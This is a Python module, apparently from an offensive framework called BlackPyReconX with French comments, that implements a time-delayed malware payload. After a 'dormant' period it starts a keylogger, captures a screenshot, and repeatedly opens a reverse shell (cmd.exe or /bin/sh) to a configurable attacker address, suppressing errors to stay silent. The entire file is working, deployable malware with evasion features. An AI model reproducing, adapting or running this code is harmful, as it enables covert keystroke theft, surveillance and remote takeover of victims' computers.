# BlackPyReconX - Un framework d'attaque complet
# Copyright (C) 2025 Hermann KEKE
#
# Ce programme est un logiciel libre ; vous pouvez le redistribuer et/ou le
# modifier selon les termes de la Licence publique générale GNU telle que
# publiée par la Free Software Foundation ; soit la version 3 de la Licence,
# soit (à votre choix) toute version ultérieure.
#
# Ce programme est distribué dans l'espoir qu'il sera utile,
# mais SANS AUCUNE GARANTIE ; sans même la garantie implicite de
# QUALITÉ MARCHANDE ou d'ADÉQUATION À UN USAGE PARTICULIER. Voir la
# Licence publique générale GNU pour plus de détails.
#
# Vous devriez avoir reçu une copie de la Licence publique générale GNU
# avec ce programme. Si non, voir <https://www.gnu.org/licenses/>.

import socket
import subprocess
import os
import threading
from pynput.keyboard import Listener, Key
import pyautogui
import datetime
import time

# --- CONFIGURATION DE L'AGENT DORMANT ---
# Le payload ne s'activera qu'à partir de cette date.
# Mettez une date dans le futur. Format : Année, Mois, Jour
ACTIVATION_DATE = datetime.date.today() + datetime.timedelta(days=3)

# --- CONFIGURATION DU PAYLOAD ---
REVERSE_HOST = '127.0.0.1' # IP de l'attaquant
REVERSE_PORT = 4444
# Construction d'un chemin absolu pour plus de robustesse
LOG_FILE = os.path.join(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')), 'outputs', 'keylogs', 'keylog.txt')

# --- FONCTIONS DU PAYLOAD ---
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            else:
                f.write(f" [{key.name}] ")

def start_keylogger():
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with Listener(on_press=on_press) as listener:
        listener.join()

def take_screenshot():
    screenshot_dir = os.path.join(os.path.dirname(LOG_FILE), '..', 'screenshots')
    os.makedirs(screenshot_dir, exist_ok=True)
    screenshot_path = os.path.join(screenshot_dir, "screenshot.png")
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception:
        return None

def reverse_shell():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((REVERSE_HOST, REVERSE_PORT))
            # Utiliser Popen pour un processus non bloquant
            p = subprocess.Popen(["cmd.exe"] if os.name == 'nt' else ["/bin/sh", "-i"], 
                                 stdin=s.fileno(), 
                                 stdout=s.fileno(), 
                                 stderr=s.fileno())
            p.wait() # Attendre que le processus se termine
    except Exception:
        pass # Rester silencieux en cas d'erreur

# --- FONCTION PRINCIPALE DU MODULE ---
def run(target=None):
    # --- VÉRIFICATION DE L'AGENT DORMANT ---
    today = datetime.date.today()
    if today < ACTIVATION_DATE:
        # La date d'activation n'est pas encore atteinte.
        # Le script se termine silencieusement.
        return

    # --- LE PAYLOAD EST ACTIF ---
    # Toutes les actions malveillantes sont exécutées à partir d'ici.
    
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    take_screenshot()

    # Tenter de se connecter en boucle en cas d'échec
    while True:
        reverse_shell()
        time.sleep(30) # Réduire le délai de reconnexion à 30 secondes

if __name__ == '__main__':
    run()
